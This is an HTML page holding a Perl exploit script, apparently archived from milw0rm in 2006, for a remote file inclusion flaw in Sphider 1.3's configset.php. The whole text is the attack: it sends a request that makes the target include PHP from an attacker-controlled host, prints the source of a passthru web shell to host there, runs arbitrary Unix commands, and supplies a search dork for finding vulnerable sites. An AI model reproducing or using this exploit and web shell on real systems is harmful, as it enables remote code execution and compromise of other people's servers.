<html><head><title>Sphider <= 1.3 (configset.php) Arbitrary Remote Inclusion Exploit</title></head><pre>#!/usr/bin/perl
use IO::Socket;

print &quot;\r\nSphider &lt;= 1.3 arbitrary remote inclusion\r\n&quot; ;
print &quot;-&gt; works with register_globals = On &amp; allow_url_fopen = On\r\n&quot;;
print &quot;by rgod rgod&lt;AT&gt;autistici&lt;DOT&gt;org\r\n&quot;;
print &quot;site: http://retrogod.altervista.org\r\n&quot;;
print &quot;\r\ndork: \&quot;powered by sphider\&quot;\r\n&quot;;

sub main::urlEncode {
    my ($string) = @_;
    $string =~ s/(\W)/&quot;%&quot; . unpack(&quot;H2&quot;, $1)/ge;
    #$string# =~ tr/.//;
    return $string;
 }

$serv=$ARGV[0];
$path=$ARGV[1];
$loc=urlEncode($ARGV[2]);
$cmd=&quot;&quot;; for ($i=3; $i&lt;=$#ARGV; $i++) {$cmd.=&quot;%20&quot;.urlEncode($ARGV[$i]);};

if (@ARGV &lt; 4)
{
print &quot;\r\nUsage:\r\n&quot;;
print &quot;perl sphider_xpl.pl server path location command\r\n\r\n&quot;;
print &quot;server         - Server where sphider is installed.\r\n&quot;;
print &quot;path           - Path to sphider (ex: /sphider/ or just /) \r\n&quot;;
print &quot;location       - a site with the code to include (without ending slash)\r\n&quot;;
print &quot;command        - a Unix command\r\n\r\n&quot;;
print &quot;Example:\r\n&quot;;
print &quot;perl sphider_xpl.pl localhost /sphider/ http://192.168.1.3 ls -la\r\n\r\n&quot;;
print &quot;note: on http location you need this code in /conf.php/index.html :\r\n\r\n&quot;;
print &quot;&lt;?php\r\n&quot;;
print &quot;ob_clean();\r\n&quot;;
print &quot;if (get_magic_quotes_gpc())\r\n&quot;;
print &quot;{\$_GET[\&quot;cmd\&quot;]=stripslashes(\$_GET[\&quot;cmd\&quot;]);}\r\n&quot;;
print &quot;ini_set(\&quot;max_execution_time\&quot;,0);\r\n&quot;;
print &quot;echo 56789;\r\n&quot;;
print &quot;passthru(\$_GET[\&quot;cmd\&quot;]);\r\n&quot;;
print &quot;die;\r\n&quot;;
print &quot;?&gt;\r\n&quot;;
exit();
}
  $sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$serv&quot;, Timeout  =&gt; 10, PeerPort=&gt;&quot;http(80)&quot;)
  or die &quot;[+] Connecting ... Could not connect to host.\n\n&quot;;
  print $sock &quot;GET &quot;.$path.&quot;admin/configset.php?cmd=&quot;.$cmd.&quot;&amp;settings_dir=&quot;.$loc.&quot; HTTP/1.0\r\n&quot;;
  print $sock &quot;Host: &quot;.$serv.&quot;\r\n&quot;;
  print $sock &quot;Connection: Close\r\n\r\n&quot;;
  $out=&quot;&quot;;
  while ($answer = &lt;$sock&gt;) {
    $out.=$answer;
  }
  close($sock);
  @temp= split /56789/,$out,2;
  if ($#temp&gt;0) {print &quot;\r\nExploit succeeded...\r\n&quot;.$temp[1];exit();}
  #if you are here...
  print &quot;\r\nExploit failed...\r\n&quot;;

# milw0rm.com [2006-04-12]</pre></html>